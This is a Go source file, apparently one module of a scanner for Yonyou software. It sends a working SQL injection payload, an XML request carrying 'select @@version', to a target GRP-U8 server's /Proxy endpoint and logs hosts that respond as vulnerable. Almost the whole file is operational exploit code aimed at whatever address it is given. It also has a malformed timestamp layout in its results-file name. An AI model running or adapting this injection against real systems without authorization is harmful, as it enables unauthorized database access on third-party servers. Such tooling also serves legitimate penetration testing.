package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func GRPProxyScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	GRPProxy := "用友 GRP-U8 Proxy SQL注入漏洞"
	urls := address + "/Proxy"
	data := url.Values{}
	data.Set("cVer", "9.8.0")
	data.Set("dp", `<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>`)

	// 发送POST请求,这个方法默认是application/x-www-form-urlencoded
	response, err := client.PostForm(urls, data)
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, GRPProxy)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, GRPProxy)
		}
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, GRPProxy, err)
		fmt.Println(output)
		return
	}

	if strings.Contains(string(body), "METADATA") || strings.Contains(string(body), "DATA") || strings.Contains(string(body), "R9PACKET") {
		result8 := GRPProxy + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result8, filename)
		if err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] 保存结果到文件出错: %v", Cyan, currentTime, Reset, Yellow, Reset, err)
			fmt.Println(output)
		}
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Cyan, currentTime, Reset, Green, Reset, GRPProxy, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s 响应码: %d", Cyan, currentTime, Reset, Yellow, Reset, GRPProxy, response.StatusCode)
		fmt.Println(output)
	}
}
